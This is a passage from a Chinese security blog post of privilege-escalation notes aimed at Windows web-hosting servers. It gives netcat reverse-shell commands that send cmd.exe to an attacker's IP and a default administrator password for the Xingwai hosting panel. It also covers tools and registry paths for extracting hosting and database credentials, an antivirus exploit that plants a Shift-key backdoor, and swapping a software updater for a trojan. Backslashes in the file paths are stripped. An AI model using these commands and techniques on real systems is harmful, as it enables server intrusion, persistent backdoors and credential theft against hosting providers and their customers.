+<h2 id="nc反弹提权"><a href="#nc反弹提权" class="headerlink" title="nc反弹提权"></a>nc反弹提权</h2><p>当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。</p>
+<p>不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….</p>
+<p>找个可读可写目录上传nc.exe cmd.exe</p>
+<p>-l 监听本地入栈信息</p>
+<p>-p port打开本地端口</p>
+<p>-t 以telnet形式应答入栈请求</p>
+<p>-e 程序重定向</p>
+<p>本地cmd执行：nc -vv -l -p 52 进行反弹</p>
+<p>接着在shell里执行命令：c:windowstempnc.exe -vv 服务器ip 999 -e c:windowstempcmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小很多</p>
+<p>执行成功后本地cmd命令：cd&#x2F; （只是习惯而已）</p>
+<p>接着以telnet命令连接服务器：telnet 服务器ip 999</p>
+<p>回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！</p>
+<p>坏蛋：<br>本地cmd执行：nc -vv -l -p 52 进行反弹<br>c:windowstempnc.exe -e c:windowstempcmd.exe 服务器ip 52</p>
+<p>低调小飞：<br>shell执行命令c:windowstempnc.exe -l -p 110 -t -e c:windowstempcmd.exe</p>
+<p>一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:windowstempnc.exe 命令这里输入：-vv 服务器ip 999 -e c:windowstempcmd.exe</p>
+<p>这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的。</p>
+<h2 id="星外提权–windows"><a href="#星外提权–windows" class="headerlink" title="星外提权–windows"></a><strong>星外提权–windows</strong></h2><p>如何知道是不是星外主机？</p>
+<p>第一：网站物理路径存在“freehost”<br>第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹</p>
+<p>默认帐号：freehostrunat<br>默认密码：fa41328538d7be36e83ae91a78a1b16f!7</p>
+<p>freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可</p>
+<p>星外常写目录：</p>
+<p>C:RECYCLER<br>C:windowstemp<br>e:recycler<br>f:recycler<br>C:phpPEAR<br>C:WINDOWS7i24.comFreeHost<br>C:phpdev<br>C:System Volume Information<br>C:7i24.comserverdoctorlog<br>C:WINDOWSTemp<br>c:windowshchiblis.ibl<br>C:7i24.comiissafelog<br>C:7i24.comLinkGatelog<br>C:Program FilesThunder NetworkThunder7<br>C:Program FilesThunder NetworkThunder<br>C:Program FilesSymantec AntiVirusSAVRT<br>c:windowsDriverPacksCAM2<br>C:Program FilesFlashFXP<br>c:Program FilesMicrosoft SQL Server90SharedErrorDumps<br>C:Program FilesZendZendOptimizer-3.3.0<br>C:Program FilesCommon Files<br>c:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csv<br>c:Program Files360360SafedeepscanSectionmutex.db<br>c:Program FilesHeliconISAPI_Rewrite3error.log<br>c:Program FilesHeliconISAPI_Rewrite3Rewrite.log<br>c:Program FilesHeliconISAPI_Rewrite3httpd.conf<br>c:Program FilesCommon FilesSymantec SharedPersist.bak<br>c:Program FilesCommon FilesSymantec SharedValidate.dat<br>c:Program FilesCommon FilesSymantec SharedValidate.dat<br>C:Program FilesZendZendOptimizer-3.3.0docs<br>C:Documents and SettingsAll UsersDRM<br>C:Documents and SettingsAll UsersApplication DataMcAfeeDesktopProtection<br>C:Documents and SettingsAll UsersApplication Data360safesoftmgr<br>C:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll<br>C:Documents and SettingsAll UsersApplication DataMicrosoftMedia Index</p>
+<h2 id="ee提权法："><a href="#ee提权法：" class="headerlink" title="ee提权法："></a>ee提权法：</h2><p>找个可读可写目录上传ee.exe</p>
+<p>cmd命令：&#x2F;c c:windowstempcookiesee.exe -i （获取星外帐号的id值，例如回显：FreeHost ID：724）</p>
+<p>接着命令：&#x2F;c c:windowstempcookiesee.exe -u 724 （获取星外的帐号密码）</p>
+<h2 id="vbs提权法："><a href="#vbs提权法：" class="headerlink" title="vbs提权法："></a>vbs提权法：</h2><p>找个可读可写目录上传cscript.exe iispwd.vbs</p>
+<p>cmd命令：&#x2F;c “c:windowstempcookiescscript.exe” c:windowstempcookiesiispwd.vbs</p>
+<p>意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录。</p>
+<p>可行思路大全：</p>
+<p>经测试以下目录中的文件权限均为everyone，可以修改，可以上传同文件名替换，删除，最重要的是还可以执行：</p>
+<p>360杀毒db文件替换:<br>c:Program Files360360SDdeepscanSectionmutex.db<br>c:Program Files360360SafedeepscanSectionmutex.db<br>C:Program Files360360SafeAntiSectionmutex.db</p>
+<p>IISrewrite3 文件替换：<br>C:Program FilesHeliconISAPI_Rewrite3Rewrite.log<br>C:Program FilesHeliconISAPI_Rewrite3httpd.conf<br>C:Program FilesHeliconISAPI_Rewrite3error.log</p>
+<p>诺顿杀毒文件替换:<br>c:Program FilesCommon FilesSymantec SharedPersist.bak<br>c:Program FilesCommon FilesSymantec SharedValidate.dat<br>c:Program FilesCommon FilesSymantec SharedPersist.Dat</p>
+<p>一流过滤相关目录及文件：<br>C:7i24.comiissafelogstartandiischeck.txt<br>C:7i24.comiissafelogscanlog.htm</p>
+<p>其他:<br>Zend文件替换：C:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll<br>华盾文件替换：C:WINDOWShchiblis.ibl<br>Flash文件替换：C:WINDOWSsystem32MacromedFlashFlash10q.ocx<br>DU Meter流量统计信息日志文件替换：c:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csv</p>
+<h2 id="360提权–windows"><a href="#360提权–windows" class="headerlink" title="360提权–windows"></a><strong>360提权–windows</strong></h2><p>找个可读可写目录上传360.exe</p>
+<p>cmd命令：&#x2F;c c:windowstempcookies360.exe</p>
+<p>会提示3段英文：</p>
+<p>360 Antivirus Privilege Escalation Exploit By friddy 2010.2.2</p>
+<p>You will get a Shift5 door!</p>
+<p>Shift5 Backdoor created! </p>
+<p>这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了……</p>
+<h2 id="搜狗提权–windows"><a href="#搜狗提权–windows" class="headerlink" title="搜狗提权–windows"></a><strong>搜狗提权–windows</strong></h2><p>搜狗的目录默认是可读可写的，搜狗每隔一段时间就会自动升级，而升级的文件是pinyinup.exe</p>
+<p>我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。</p>
+<h2 id="华众虚拟主机提权–windows"><a href="#华众虚拟主机提权–windows" class="headerlink" title="华众虚拟主机提权–windows"></a><strong>华众虚拟主机提权–windows</strong></h2><p>就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞。</p>
+<p>所以华众提权关键之处就是搜集信息，主要注册表位置：</p>
+<p>HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIG<br>HKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmysqlpass root密码<br>HKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmssqlpss sa 密码</p>
+<p>c:windowstemp 下有hzhost主机留下的ftp登陆记录有用户名和密码</p>
+<p>以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用</p>
+<p>百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具</p>
+<h2 id="N点虚拟主机–windows"><a href="#N点虚拟主机–windows" class="headerlink" title="N点虚拟主机–windows"></a><strong>N点虚拟主机–windows</strong></h2><p>N点虚拟主机管理系统默认数据库地址为：host_date#host # date#.mdb</p>
+<p>rl直接输入不行 这里咱们替换下 #&#x3D;# 空格&#x3D;</p>
+<p>修改后的下载地址为&#x2F;host_date&#x2F;#host # date#196.mdb</p>
+<p>N点数据库下载之后找到sitehost表 FTPuser&amp;FTPpass 值 FTPpass是N点加密数据然后用N点解密工具解密得到FTP密码</p>
+<p>N点默认安装路径C:Program FilesNpointSoftnpointhostweb<br>D:Program FilesNpointSoftnpointhostweb<br>默认权限可读。遇到对方所用虚拟主机是N点时候 可以考虑 读取该文件夹下载数据库</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://jzlzm.top">JIANG</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://jzlzm.top/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E5%B0%8F%E7%AC%94%E8%AE%B0/">http://jzlzm.top/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E5%B0%8F%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://jzlzm.top" target="_blank">今天阳光明媚</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/Linux/">Linux</a><a class="post-meta__tags" href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/">后渗透</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/3034930596/pic/main/img/202207151115167.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%86%E6%9E%90%E6%8E%92%E6%9F%A5%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0200713/"><img class="prev-cover" src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141611748.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">应急响应分析排查学习</div></div></a></div><div class="next-post pull-right"><a href="/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4-Mysql/"><img class="next-cover" src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141625439.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">等级保护-Mysql</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%86%E6%9E%90%E6%8E%92%E6%9F%A5%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0200713/" title="应急响应分析排查学习"><img class="cover" src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141611748.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-14</div><div class="title">应急响应分析排查学习</div></div></a></div><div><a href="/%E4%B8%80%E9%94%AE%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7/" title="windows一键创建隐藏账户"><img class="cover" src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141454280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-14</div><div class="title">windows一键创建隐藏账户</div></div></a></div><div><a href="/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4-window/" title="等级保护-window"><img class="cover" src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207140953455.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-14</div><div class="title">等级保护-window</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">JIANG</div><div class="author-info__description">挡一近卫今天也要好好摸鱼捏</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">隐藏着黑暗力量的钥匙啊,在我面前显示你真正的力量！现在以你的主人，小樱之名命令你——封印解除！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">提权笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">**web提权 **</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dos%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8"><span class="toc-number">1.2.</span> <span class="toc-text">dos命令大全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E8%AF%AD%E5%8F%A5%E7%9B%B4%E6%8E%A5%E5%BC%80%E5%90%AF3389"><span class="toc-number">1.2.1.</span> <span class="toc-text">SQL语句直接开启3389</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%9D%80%E8%BD%AF"><span class="toc-number">1.3.</span> <span class="toc-text">常见杀软</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E6%8F%90%E6%9D%83%E4%B8%AD%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E5%92%8C%E6%95%8F%E6%84%9F%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">windows提权中敏感目录和敏感注册表的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95-%E7%9B%AE%E5%BD%95%E6%9D%83%E9%99%90-%E6%8F%90%E6%9D%83%E7%94%A8%E9%80%94"><span class="toc-number">1.4.1.</span> <span class="toc-text">敏感目录 目录权限 提权用途</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E4%B8%AD%E7%9A%84%E6%95%8F%E6%84%9F%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.4.2.</span> <span class="toc-text">提权中的敏感注册表位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wscript-shell%E7%9A%84%E5%88%A0%E9%99%A4%E5%92%8C%E6%81%A2%E5%A4%8D"><span class="toc-number">1.4.3.</span> <span class="toc-text">**wscript.shell的删除和恢复 **</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E5%87%86%E7%A1%AE%E7%9A%84%E7%BB%88%E7%AB%AF%E8%BF%9E%E6%8E%A5%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.5.</span> <span class="toc-text">如何找到准确的终端连接端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iis6%E6%8F%90%E6%9D%83%E6%8F%90%E7%A4%BACan-not-find-wmiprvse-exe%E7%9A%84%E7%AA%81%E7%A0%B4%E6%96%B9%E6%B3%95"><span class="toc-number">1.6.</span> <span class="toc-text">**iis6提权提示Can not find wmiprvse.exe的突破方法 **</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-number">1.7.</span> <span class="toc-text">本地溢出提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sa%E6%8F%90%E6%9D%83-%E2%80%93windows-sqlserver%E5%8F%AA%E8%83%BD%E7%94%A8%E4%BA%8Ewindows"><span class="toc-number">1.7.1.</span> <span class="toc-text">sa提权 –windows sqlserver只能用于windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#root%E6%8F%90%E6%9D%83-%E2%80%93windows-x2F-linux"><span class="toc-number">1.7.2.</span> <span class="toc-text">root提权 –windows&#x2F;linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#serv-u%E6%8F%90%E6%9D%83-%E2%80%93ftp%E2%80%93windows"><span class="toc-number">1.7.3.</span> <span class="toc-text">serv-u提权 –ftp–windows</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">1.8.</span> <span class="toc-text">端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc%E5%8F%8D%E5%BC%B9%E6%8F%90%E6%9D%83"><span class="toc-number">1.9.</span> <span class="toc-text">nc反弹提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%9F%E5%A4%96%E6%8F%90%E6%9D%83%E2%80%93windows"><span class="toc-number">1.10.</span> <span class="toc-text">星外提权–windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ee%E6%8F%90%E6%9D%83%E6%B3%95%EF%BC%9A"><span class="toc-number">1.11.</span> <span class="toc-text">ee提权法：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vbs%E6%8F%90%E6%9D%83%E6%B3%95%EF%BC%9A"><span class="toc-number">1.12.</span> <span class="toc-text">vbs提权法：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#360%E6%8F%90%E6%9D%83%E2%80%93windows"><span class="toc-number">1.13.</span> <span class="toc-text">360提权–windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%8B%97%E6%8F%90%E6%9D%83%E2%80%93windows"><span class="toc-number">1.14.</span> <span class="toc-text">搜狗提权–windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%8E%E4%BC%97%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83%E2%80%93windows"><span class="toc-number">1.15.</span> <span class="toc-text">华众虚拟主机提权–windows</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#N%E7%82%B9%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E2%80%93windows"><span class="toc-number">1.16.</span> <span class="toc-text">N点虚拟主机–windows</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/%E4%B8%80%E9%94%AE%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7/" title="windows一键创建隐藏账户"><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141454280.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="windows一键创建隐藏账户"/></a><div class="content"><a class="title" href="/%E4%B8%80%E9%94%AE%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7/" title="windows一键创建隐藏账户">windows一键创建隐藏账户</a><time datetime="2022-07-14T08:20:40.000Z" title="发表于 2022-07-14 16:20:40">2022-07-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/hello-world/" title="Hello World"><img src="/img/index_img.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/hello-world/" title="Hello World">Hello World</a><time datetime="2022-07-13T07:37:29.754Z" title="发表于 2022-07-13 15:37:29">2022-07-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%86%E6%9E%90%E6%8E%92%E6%9F%A5%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0200713/" title="应急响应分析排查学习"><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141611748.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急响应分析排查学习"/></a><div class="content"><a class="title" href="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%86%E6%9E%90%E6%8E%92%E6%9F%A5%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0200713/" title="应急响应分析排查学习">应急响应分析排查学习</a><time datetime="2022-06-14T08:20:40.000Z" title="发表于 2022-06-14 16:20:40">2022-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E5%B0%8F%E7%AC%94%E8%AE%B0/" title="内网提权小笔记"><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207151115167.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网提权小笔记"/></a><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E5%B0%8F%E7%AC%94%E8%AE%B0/" title="内网提权小笔记">内网提权小笔记</a><time datetime="2021-11-19T08:20:40.000Z" title="发表于 2021-11-19 16:20:40">2021-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4-Mysql/" title="等级保护-Mysql"><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141625439.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="等级保护-Mysql"/></a><div class="content"><a class="title" href="/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4-Mysql/" title="等级保护-Mysql">等级保护-Mysql</a><time datetime="2021-10-15T08:20:40.000Z" title="发表于 2021-10-15 16:20:40">2021-10-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2022 By JIANG</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
